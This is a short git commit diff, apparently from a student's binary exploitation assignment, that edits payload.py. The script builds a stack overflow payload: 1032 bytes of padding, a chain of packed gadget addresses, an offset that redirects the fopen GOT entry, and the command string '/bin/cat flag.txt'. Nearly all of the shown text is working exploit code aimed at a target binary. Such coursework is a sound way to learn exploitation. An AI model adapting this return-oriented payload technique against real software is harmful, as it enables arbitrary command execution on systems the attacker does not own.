de8099c3b86998354eae89d5e76fe912bc1e9da6
Chirath02 <chirath.02@gmail.com>
2017-05-02 11:38:35 +0530

    Completed assigment 2

--- binexp_assignment2/payload.py
+++ binexp_assignment2/payload.py
@@ -6,6 +6,7 @@ fopen_addr = 0x400530
 fopen_got_addr = 0x601040
 
 got_offset = 170208
+got_offset_exit = 216272
 
 payload = 'A' * 1032
 payload += struct.pack('<Q', g1+1)
@@ -13,9 +14,9 @@ payload += struct.pack('<Q', fopen_got_addr-16)
 payload += struct.pack('<Q', g1+10)
 payload += struct.pack('<Q', got_offset)
 payload += struct.pack('<Q', g1+1)
-payload += struct.pack('<Q', 0x18)
+payload += struct.pack('<Q', 0x20)
 payload += struct.pack('<Q', g1+3)
-payload += 'cat flag.txt' + '\x00' * 12
+payload += '/bin/cat flag.txt' + '\x00' * 15
 payload += struct.pack('<Q', g1)
 payload += struct.pack('<Q', fopen_addr)
 
